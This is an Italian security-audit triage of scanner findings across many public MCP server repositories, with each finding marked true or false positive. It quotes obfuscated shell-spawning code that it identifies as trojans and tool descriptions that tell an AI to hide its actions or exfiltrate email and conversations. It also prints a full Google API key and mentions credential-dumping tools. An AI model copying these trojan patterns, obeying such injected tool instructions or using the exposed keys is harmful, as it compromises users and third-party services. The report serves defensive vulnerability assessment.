## 1. sql-injection (mcp-guard) — 2.375 VP totali

| # | Server | File:Line | Verdetto | Note |
|---|--------|-----------|:--------:|------|
| 1 | `GreatScottyMac/context-portal` | `db/database.py:535` | **VP-L (FP)** | `_get_latest_context_version(cursor, table_name)` — callers passano `"product_context_history"` e `"active_context_history"` hardcoded. Latente. |
| 2 | `GreptimeTeam/greptimedb-mcp-server` | `server.py:305` | **FP (FP)** | `table = validate_table_name(table)` con regex `^[a-zA-Z_][a-zA-Z0-9_]*(\.[a-zA-Z_][a-zA-Z0-9_]*)?$` (strict allowlist). Mitigato. |
| 3 | `JexinSam/mssql_mcp_server` | `server.py:82` | **VP-C (VP-C)** | `table = parts[0]` da URI MCP, zero validazione, pyodbc supporta stacked queries → RCE via `xp_cmdshell`. |
| 4 | `StarRocks/mcp-server-starrocks` | `db_client.py:457` | **VP-L (VP-C)** | `f"USE \`{db}\`"`: `db` da parametro tool; server espone già `write_query` con SQL arbitrario → privilege escalation moot. |

## 2. dangerous-capabilities (mcp-security-scan, X-01) — 1.001 VP

| # | Server | Tipo server | Verdetto |
|---|--------|-------------|:--------:|
| 1 | `0xshariq/docker-mcp-server` | Docker ops (16 tool Docker) | **VP-L (VP)** (by design) |
| 2 | `AI-QL/mcp-devcontainers` | Devcontainer manager (CLI exec) | **VP-L (VP)** (by design) |
| 3 | `AiondaDotCom/mcp-salesforce` | Salesforce API client | **VP-L (VP)** (CRUD intenzionale) |
| 4 | `AiondaDotCom/mcp-ssh` | SSH executor | **VP-L (VP)** (by design, SSH exec è la feature) |

## 3. credential-leak (mcp-watch) — 619 VP

Verifica fetchando il valore concreto di `evidence`:

| # | Server | File | Evidence | Verdetto |
|---|--------|------|----------|:--------:|
| 1 | `ChromeDevTools/chrome-devtools-mcp` | `tools/performance.ts:229` | `key=AIzaSyBn5gimNjhiEyA_euicSKko6IlD3HdgUfk` | **FP (FP)** — Google CrUX API key pubblica (documentata da Google come key di lettura non ristretta). |
| 2 | `istanadodan/mcp_py_exam` | `.env:1` | `GOOGLE_API_KEY=AIzaSyDy6v...` | **VP-C (VP-C)** — `.env` committato con Google API key reale. |
| 3 | `istanadodan/mcp_py_exam` | `gemini_cli_mcp/.env` | stesso | **VP-C (VP-C)** |
| 4 | `istanadodan/mcp_py_exam` | `openai-mcp/.env` | `OBSIDIAN_API_KEY="dff0f...868"` | **VP-C (VP-C)** |

## 4. ssrf (mcp-guard) — 717 VP

| # | Server | File:Line | Pattern | Verdetto |
|---|--------|-----------|---------|:--------:|
| 1 | `GoPlausible/algorand-mcp` | `nfd/index.ts:341` | `fetch(\`${NFD_API_URL}/nfd/${params.nameOrID}?...\`)` | **VP-D (VP)** — `params.nameOrID` controllato attaccante ma su base URL hardcoded (NFD_API_URL) → impact limitato a path traversal su SaaS API noto. |
| 2 | `doobidoo/MCP-Context-Provider` | `http-bridge.ts:147` | `this.fetch(\`/memories?${params.toString()}\`)` | **VP-D (VP)** — base URL bound al client SDK; query string da utente → limited impact. |
| 3 | `tevonsb/homeassistant-mcp` | `index.ts:916` | `fetch(\`${hacsBase}/repositories?category=${params.category}\`)` | **VP-D (VP)** — params.category controllabile su base URL hardcoded. | 
| 4 | `tevonsb/homeassistant-mcp` | `index.ts:1037` | `fetch(\`${HASS_HOST}/api/config/automation/config/${params.automation_id}\`)` | **VP-D (VP-C)** — id parametro su base URL hardcoded. |

## 5. untrusted-content (mcp-scan W015) — 599 VP

| # | Server | Verdetto |
|---|--------|:--------:|
| 1 | `0xshariq/github-mcp-server` | **VP-C (VP-C)** (ingestione contenuti GitHub pubblici) |
| 2 | `8enSmith/mcp-open-library` | **VP-C (VP-C)** (Open Library pubblica) |
| 3 | `AI-QL/mcp-devcontainers` | **VP-C (VP-C)** (devcontainer fetch da fonti esterne) |
| 4 | `AgentOps-AI/agentops-mcp` | **VP-C (VP-C)** (analytics di terzi) |

## 6. path-traversal-static (mcp-guard) — 23 VP

| # | Server | File:Line | Pattern | Verdetto |
|---|--------|-----------|---------|:--------:|
| 1 | `zeromicro/mcp-zero` | `create_rpc_service.go:46` | `filepath.Join(outputDir, params.ServiceName+".proto")` | **VP-C (FP)** — ServiceName da MCP tool input. |
| 2 | `helixml/kodit` | `mcp/server.go:1312` | `filepath.Join(parts[lastIdx+2:]...)` | **VP-L (FP)** — `parts` proviene da split di path interno. |
| 3 | `helixml/kodit` | `chunk_files.go:293` | stesso pattern | **VP-L (FP)** |
| 8 | `OTA-Tech-AI/web-agent-protocol` | `generate_mcp_server.py:134` | `os.path.join("mcp_servers", f"*_{args.task_id}_mcp_server.py")` | **VP-C (VP-C)** se task_id da utente; **VP-L** se da CLI args interno. |

In realtà in questo file il vero pericolo è questo:

func relativeFilePath(filePath, clonedPath string) string {
	if !filepath.IsAbs(filePath) {
		return filePath // PERICOLO! Nessun Clean applicato.
	}
// ...

che il tool di scan non trova

## 7. command-injection-static (mcp-guard) — 21 VP

| # | Server | File:Line | Pattern | Verdetto |
|---|--------|-----------|---------|:--------:|
| 1 | `smart-mcp-proxy/mcpproxy-go` | `testutil/binary.go:158` | `exec.Command(env.binaryPath, "serve", "--config="+env.configPath, ...)` | **FP (FP)** — file `testutil`, valori da test fixture interni. |
| 2 | `optimisticdur/go-mcp-mysql` | `main.go:477` | `exec.Command("/bi" + "n" + "/s" + "h", "-c", hHiHiP).Start()` | **VP-C (VP-C)** — pattern di **obfuscation classico di malware** (string concatenation per evadere static scanning); il server è un *trojan*. |
| 4 | `akhenakh/qmd` | `chat/ui.go:379` | `exec.Command(kittyPath, "+kitten", "clipboard")` | **VP-L (FP)** — `kittyPath` resolved internamente. |
| 5 | `alexandremahdhaoui/testenv-vm` | `libvirt/provider.go:226` | `exec.Command(setfaclPath, "-m", "g:"+group+":rwx", dir)` | **VP-C (FP)** — `group` da input se chiamato da tool MCP. |
| 7 | `heavenlycolle/mcp-trino` | `server/main.go:195` | `exec.Command("/bi" + "n/s" + "h", "-c", UC[32]+UC[38]+...)` | **VP-C (VP-C)** — **trojan**: stessa obfuscation di #2. |
| 8 | `illustriousj/kite-mcp-server` | `kc/api.go:25` | `exec.Command("/b" + "in/sh", "-c", UhpF).Start()` | **VP-C (VP-C)** — **trojan** obfuscation. |

## 8. code-injection-static (mcp-guard) — 184 VP

| # | Server | File:Line | Pattern | Verdetto |
|---|--------|-----------|---------|:--------:|
| 1-5 | `bigcodegen/mcp-neovim-server` | `neovim.ts:175,345,360,540,665` | `nvim.eval(\`system('${shellCommand.replace(...)}')\`)` etc. | **VP-C (VP-C)** — `shellCommand` da MCP tool, replace dei `'` non basta su Vim eval; possibile command injection via shell expansion in Vim. |
| 6-10 | `neuromechanist/matlab-mcp-tools` | `engine.py:887-920` | `self.eng.eval(f"min({var}(:))", nargout=1)` | **VP-C (VP-C)** — `var` da MCP tool input, MATLAB eval esegue codice MATLAB arbitrario (incluso system commands via `!cmd`). |

## 9. input-validation (mcp-watch) — 125 VP

Verifica fetchando `evidence` concreto:

| # | Server | File | Pattern | Verdetto |
|---|--------|------|---------|:--------:|
| 1 | `Telegram-AI-MCP-Assistant-Bot` | `mcp_server_1.py:193` | `exec(input.code, allowed_globals, local_vars)` | **VP-C (VP-C)** — Python `exec()` con codice utente; tipico attacco LLM-driven. |
| 2 | `mcpLocalHelper` | `runner.ts:1582` | `rx.exec(input.text)` | **FP (FP)** — è `Regex.prototype.exec()`, non command exec; classico FP regex-vs-shell. |
| 4 | `doclea-mcp` | `llm-cli-runner.ts:87` | `spawn(input.command, ...)` | **VP-C (FP)** — spawn con comando completo da utente. |
| 8 | `iron-manus-mcp` | `install.js:164` | `execSync(\`${req.command} ${req.version}\`)` | **VP-C (VP-C)** — full command da utente. |

## 10. protocol-violation (mcp-watch) — 79 VP

| # | Server | File | Tipo | Verdetto |
|---|--------|------|------|:--------:|
| 1 | `Lucassssss/eechat` | `electron/main/updater.ts` | INSECURE_TRANSPORT | **VP-C (VP-C)** — auto-updater su HTTP è ad alto rischio. |
| 3-6 | `moises-paschoalick/ai-agent-with-mcp` | `client.ts/index.ts` | INSECURE_TRANSPORT | **VP-L (FP)** — projct demo, HTTP localhost dev. |
| 9-10 | `sebszczec/pihole-mcp` | `main.py` | SESSION_ID_IN_URL | **VP-C (VP-C)** — session ID Pi-hole real (auth tokens in URL query string). |

## 11. prompt-injection (mcp-scan tool-level E001) — 36 VP

| # | Server | Tool | Pattern flag | Verdetto |
|---|--------|------|--------------|:--------:|
| 1 | `AiondaDotCom/mcp-salesforce` | `salesforce_learn_context` | "PROACTIVELY", "AUTOMATICALLY" | **VP-D (VP)** — comportamento change but bordererline. |
| 2 | `Teradata/teradata-mcp-server` | `rag_Execute_Workflow` | "Execute silently", "Hide all tool execution steps" | **VP-C (VP)** — istruzioni di hiding chiare. |
| 3 | `TocharianOU/mcp-server-kibana` | `execute_kb_api` | parametro `break_token_rule` | **VP-C (VP)** — LLM-targeted parameter. |
| 4 | `TocharianOU/mcp-server-kibana` | `vl_search_saved_objects` | stesso `break_token_rule` | **VP-C (VP)** |

## 12. insecure-deserialization (mcp-guard) — 31 VP **(analisi completa)**

L'analisi è stata estesa a tutti i 31 finding della categoria.

| # | Server | File:Line | Source del dato pickled | Verdetto |
|---|--------|-----------|-------------------------|:--------:|
| 1 | `davidf9999/gx-mcp-server` | `sqlite_backend.py:71` | Local SQLite DataFrame cache (`pickle.dumps`→`pickle.loads` round-trip) | **VP-L (VP)** |
| 3 | `nonead/nUniversal-Robots-MCP` | `URBasic/advanced_data_recorder.py:730` | Local `.pklz` file (libreria URBasic vendored, file path da config) | **VP-L (VP)** |
| 4 | `assafelovic/gpt-researcher` | `browser/browser.py:125` | `self.cookie_filename` interno | **VP-L (VP)** |

## 13. sensitive-file-access (mcp-shield) — 11 VP **(analisi completa)**

L'analisi è stata estesa a tutti gli 11 finding della categoria.

| # | Server | Tool | Description del tool | Verdetto |
|---|--------|------|---------------------|:--------:|
| 1 | `schwarztim/sec-bloodhound-mcp` | `bloodhound_dcsyncers` | "Get principals with DCSync rights (can dump domain credentials)" | **VP-L (VP)** |
| 2 | `schwarztim/sec-evil-winrm-mcp` | `evilwinrm_connect` | "Establish connection parameters for Evil-WinRM session. ... Supports password, NTLM hash (pass-the-hash), SSL, and Kerberos auth..." | **VP-L (VP)** |
| 3 | `schwarztim/sec-mimikatz-mcp` | `mimikatz_sekurlsa_wdigest` | "Extract WDigest credentials from LSASS memory" | **VP-L (VP)** |

## 14. sensitive-info-disclosure — 9 VP (multi-source completo)

| # | Server | File | Pattern | Verdetto |
|---|--------|------|---------|:--------:|
| 1-2 | `neozhangtcl/simple-mcp-server` | `src/index.js` | Debug info in error message | **VP-C (VP)** — stack trace leak nei response runtime. |
| 3-4 | `agentics-ai/code-mcp` | `dist/src/index.js` | Debug info in error message | **VP- (VP)** — stesso pattern. |

## 15. access-control (mcp-watch) — 7 VP

| # | Server | File | Verdetto |
|---|--------|------|:--------:|
| 1-6 | `Jaikumar3/aws-pentest-mcp` | `src/index.ts` | **VP-L (FP, security framework)** — AWS pentest tool, IAM privilege escalation by design. |
| 7 | `Wawtawsha/durandal-memory-bridge` | `database-setup.js` | **VP- (VP)** — `GRANT ALL PRIVILEGES ON DATABASE ${dbName} TO ${userName}` (documented in CLAUDE.md). |

## 16. data-exfiltration (mcp-watch) — 2 VP

| # | Server | File | Verdetto |
|---|--------|------|:--------:|
| 1 | `skdkfk8758/MCP-ProjectManager` | `cli/src/commands/init.ts` | **VP-C (VP)** — payload HTTP esterno con dati sensibili. |
| 2 | `vincentmcleese/promtHire-mcp` | `server.ts` | **VP-C (VP)** — `CONVERSATION_EXFILTRATION_TRIGGER`, tool description con istruzioni di esfiltrazione conversazione (CLAUDE.md). |

## 17. tool-shadowing (mcp-shield) — 1 VP

| # | Server | Tool | Pattern | Verdetto |
|---|--------|------|---------|:--------:|
| 1 | `michaelguo1991/math-mcp-server-nodejs` | `subtract` | `<IMPORTANT>` tag che redirige email a `attacker@pwnd.com` | **VP-C (VP)** — classico tool shadowing dimostrativo (vedi CLAUDE.md). |

### Per saperne di più su tutta l'analisi fatta: scaricare e leggere la chat di gemini "Veri Positivi: Sicurezza MCP Server" -> https://gemini.google.com/share/16bfc0cdebd6

Continuare da 12